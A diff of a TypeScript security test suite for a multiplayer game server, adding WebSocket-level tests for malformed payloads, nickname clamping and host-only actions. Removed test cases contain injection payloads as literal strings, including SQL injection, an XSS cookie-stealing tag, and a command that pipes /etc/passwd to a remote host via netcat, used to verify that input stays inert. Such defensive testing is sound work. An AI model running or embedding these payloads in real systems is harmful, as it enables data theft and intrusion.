@@ -37,6 +37,32 @@ function waitForState(
 }
 
 describe('Security Hardening & OWASP Vulnerability Verification', () => {
+  let httpServer: HttpServer;
+  let port: number;
+  let sock1: TypedClientSocket;
+  let sock2: TypedClientSocket;
+
+  beforeAll(async () => {
+    httpServer = createServer();
+    setupSocketServer(httpServer);
+
+    await new Promise<void>((resolve) => {
+      httpServer.listen(0, '127.0.0.1', () => {
+        const addr = httpServer.address();
+        if (typeof addr === 'object' && addr) {
+          port = addr.port;
+        }
+        resolve();
+      });
+    });
+  });
+
+  afterAll(() => {
+    if (sock1?.connected) sock1.disconnect();
+    if (sock2?.connected) sock2.disconnect();
+    httpServer.close();
+  });
+
   const createMockPlayer = (id: string, nickname: string, isHost = false): Player => ({
     id,
     nickname,
@@ -48,71 +74,90 @@ describe('Security Hardening & OWASP Vulnerability Verification', () => {
   });
 
   // =========================================================================
-  // 1. Injection Vulnerabilities (SQLi & Command Injection)
+  // 1. Raw Socket Layer Validation & DoS Prevention
   // =========================================================================
-  describe('A03:2021 - Injection Prevention (SQLi & OS Command Injection)', () => {
-    test('SQL Injection payloads are treated as literal text and do not execute', () => {
-      const p1 = createMockPlayer('p1', "' OR 1=1; --", true);
-      const p2 = createMockPlayer('p2', "admin' UNION SELECT * FROM users; --");
+  describe('A03:2021 & A04:2021 - Socket Server Validation & DoS Mitigation', () => {
+    test('Server rejects malformed non-string payloads over WebSocket without crashing', async () => {
+      const url = `http://127.0.0.1:${port}`;
+      sock1 = Client(url, { transports: ['websocket'] });
+      await new Promise<void>((res) => sock1.on('connect', res));
 
-      let room: RoomState = GameEngine.createRoom('TEST', p1);
-      room.players['p2'] = p2;
-      room = GameEngine.startWritingPhase(room);
+      // Attempt to crash server with numbers, null, objects, and arrays as nickname
+      const malformedPayloads = [
+        { nickname: 12345 },
+        { nickname: null },
+        { nickname: {} },
+        { nickname: ['hacked'] },
+      ];
 
-      const promptId = room.prompts[0].id;
-      const sqliPayload = "'; DROP TABLE rooms; SELECT * FROM pg_tables; --";
-
-      const res = GameEngine.recordAnswer(room, 'p1', promptId, sqliPayload);
-      expect(res.ok).toBe(true);
-
-      const recorded = room.answers.find((a) => a.playerId === 'p1' && a.promptId === promptId);
-      expect(recorded?.text).toBe(sqliPayload.slice(0, 45));
-      expect(room.players['p1'].nickname).toBe("' OR 1=1; --");
+      for (const payload of malformedPayloads) {
+        const res = await new Promise<{ ok: boolean; error?: string }>((resolve) => {
+          sock1.emit('room:create', payload as any, resolve);
+        });
+        expect(res.ok).toBe(false);
+        expect(res.error).toBeDefined();
+      }
     });
 
-    test('Command injection characters are treated as literal strings', () => {
-      const p1 = createMockPlayer('p1', '$(whoami)', true);
-      const room: RoomState = GameEngine.createRoom('TEST', p1);
-      const promptId = 'prompt-dummy';
-      room.assignments['p1'] = [promptId];
+    test('Server strictly clamps oversized nicknames to 16 characters over raw socket', async () => {
+      const hugeNickname = 'SuperLongHackerNameExceedingLimit1234567890';
+      const res = await new Promise<{ ok: boolean; roomCode?: string }>((resolve) => {
+        sock1.emit('room:create', { nickname: hugeNickname }, resolve);
+      });
 
-      const cmdPayload = '; cat /etc/passwd | nc 10.0.0.1 1337 &';
-      const res = GameEngine.recordAnswer(room, 'p1', promptId, cmdPayload);
       expect(res.ok).toBe(true);
+      const roomCode = res.roomCode!;
 
-      const answer = room.answers.find((a) => a.playerId === 'p1');
-      expect(answer?.text).toBe(cmdPayload.slice(0, 45));
+      const state = await waitForState(sock1, (s) => s.roomCode === roomCode);
+      const hostPlayer = state.players.find((p) => p.isHost);
+      expect(hostPlayer?.nickname.length).toBeLessThanOrEqual(16);
+      expect(hostPlayer?.nickname).toBe(hugeNickname.slice(0, 16));
     });
-  });
 
-  // =========================================================================
-  // 2. Cross-Site Scripting (XSS / HTML Injection)
-  // =========================================================================
-  describe('A03:2021 - Stored & Reflected XSS Sanitization', () => {
-    test('Script tags and event handlers are stored purely as literal text', () => {
-      const xssNickname = '<script>alert(1)</script>';
-      const xssQuip = '<img src=x onerror="alert(document.cookie)">';
-
-      const p1 = createMockPlayer('p1', xssNickname, true);
-      let room: RoomState = GameEngine.createRoom('TEST', p1);
-      room = GameEngine.startWritingPhase(room);
-
-      const promptId = room.prompts[0].id;
-      const res = GameEngine.recordAnswer(room, 'p1', promptId, xssQuip);
-      expect(res.ok).toBe(true);
-
-      const clientState = GameEngine.getClientState(room, 'p1');
-      expect(clientState.players[0].nickname).toBe(xssNickname);
-
-      // Verify that no raw HTML evaluation or unescaped execution is permitted
-      expect(typeof clientState.players[0].nickname).toBe('string');
+    test('Server rejects joining with malformed roomCode over socket', async () => {
+      const res = await new Promise<{ ok: boolean; error?: string }>((resolve) => {
+        sock1.emit('room:join', { roomCode: 12345 as any, nickname: 'Hacker' }, resolve);
+      });
+      expect(res.ok).toBe(false);
+      expect(res.error).toContain('Invalid join parameters');
     });
   });
 
   // =========================================================================
-  // 3. Broken Access Control & Authorization (OWASP A01:2021)
+  // 2. Broken Access Control & Anti-Cheating (OWASP A01:2021)
   // =========================================================================
-  describe('A01:2021 - Broken Access Control & Anti-Cheating', () => {
+  describe('A01:2021 - Broken Access Control & Cross-Player Isolation', () => {
+    test('Non-host socket cannot trigger game:start or game:restart', async () => {
+      const url = `http://127.0.0.1:${port}`;
+      sock2 = Client(url, { transports: ['websocket'] });
+      await new Promise<void>((res) => sock2.on('connect', res));
+
+      // Client 1 creates room
+      const createRes = await new Promise<{ ok: boolean; roomCode?: string }>((resolve) => {
+        sock1.emit('room:create', { nickname: 'HostAlice' }, resolve);
+      });
+      const roomCode = createRes.roomCode!;
+
+      // Client 2 joins room
+      await new Promise<void>((resolve) => {
+        sock2.emit('room:join', { roomCode, nickname: 'GuestBob' }, () => resolve());
+      });
+
+      // Client 2 (non-host) attempts game:start
+      const startRes = await new Promise<{ ok: boolean; error?: string }>((resolve) => {
+        sock2.emit('game:start', resolve);
+      });
+      expect(startRes.ok).toBe(false);
+      expect(startRes.error).toContain('host');
+
+      // Client 2 (non-host) attempts game:restart
+      const restartRes = await new Promise<{ ok: boolean; error?: string }>((resolve) => {
+        sock2.emit('game:restart', resolve);
+      });
+      expect(restartRes.ok).toBe(false);
+      expect(restartRes.error).toBeDefined();
+    });
+
     test('Player cannot submit answers for prompts not assigned to them', () => {
       const p1 = createMockPlayer('p1', 'Alice', true);
       const p2 = createMockPlayer('p2', 'Bob');
@@ -120,11 +165,8 @@ describe('Security Hardening & OWASP Vulnerability Verification', () => {
       room.players['p2'] = p2;
       room = GameEngine.startWritingPhase(room);
 
-      const p2Prompts = room.assignments['p2'];
-      // An unassigned fake prompt
-      const fakePromptId = 'prompt-unassigned-hack';
-
-      const res = GameEngine.recordAnswer(room, 'p1', fakePromptId, 'Exploitative Quip');
+      const unassignedPromptId = 'prompt-unassigned-hack';
+      const res = GameEngine.recordAnswer(room, 'p1', unassignedPromptId, 'Exploitative Quip');
       expect(res.ok).toBe(false);
       expect(res.error).toContain('not assigned to you');
     });
@@ -173,7 +215,6 @@ describe('Security Hardening & OWASP Vulnerability Verification', () => {
       // In WRITING: p1 must NOT see other players' answers or unassigned prompts
       const p1Writing = GameEngine.getClientState(room, 'p1');
       expect(p1Writing.activePrompts?.length).toBe(2);
-      // Room answers are never included in ClientGameState
       expect((p1Writing as any).answers).toBeUndefined();
 
       // In DUEL_VOTING: Author nicknames must be completely redacted
@@ -191,14 +232,13 @@ describe('Security Hardening & OWASP Vulnerability Verification', () => {
   });
 
   // =========================================================================
-  // 4. Prototype Pollution & Malicious Identifiers
+  // 3. Prototype Pollution & Memory Safety
   // =========================================================================
   describe('Prototype Pollution & Memory Safety', () => {
     test('Blocks __proto__, constructor, and prototype injection attempts', () => {
       const p1 = createMockPlayer('p1', 'Alice', true);
       let room: RoomState = GameEngine.createRoom('TEST', p1);
       room = GameEngine.startWritingPhase(room);
-
       const promptId = room.prompts[0].id;
 
       // Attempt prototype pollution via playerId
@@ -231,32 +271,15 @@ describe('Security Hardening & OWASP Vulnerability Verification', () => {
   });
 
   // =========================================================================
-  // 5. Denial of Service, Type Confusion & Malformed Payloads
+  // 4. Input Boundary Clamping & DoS Mitigation
   // =========================================================================
-  describe('Malformed Payloads & DoS Prevention', () => {
-    test('Rejects non-string payloads without throwing unhandled exceptions', () => {
-      const p1 = createMockPlayer('p1', 'Alice', true);
-      let room: RoomState = GameEngine.createRoom('TEST', p1);
-      room = GameEngine.startWritingPhase(room);
-      const promptId = room.prompts[0].id;
-
-      // Type confusion attacks: numbers, objects, arrays, null, undefined
-      const invalidPayloads = [12345, null, undefined, {}, [], true, () => {}];
-
-      invalidPayloads.forEach((payload) => {
-        const res = GameEngine.recordAnswer(room, 'p1', promptId, payload as any);
-        expect(res.ok).toBe(false);
-        expect(res.error).toBe('Invalid payload format');
-      });
-    });
-
+  describe('Input Boundary Clamping & DoS Mitigation', () => {
     test('Clamps oversized strings to 45 characters to prevent buffer overflow/DoS', () => {
       const p1 = createMockPlayer('p1', 'Alice', true);
       let room: RoomState = GameEngine.createRoom('TEST', p1);
       room = GameEngine.startWritingPhase(room);
       const promptId = room.prompts[0].id;
 
-      // 50,000 character string attack
       const hugeString = 'A'.repeat(50000);
       const res = GameEngine.recordAnswer(room, 'p1', promptId, hugeString);
       expect(res.ok).toBe(true);
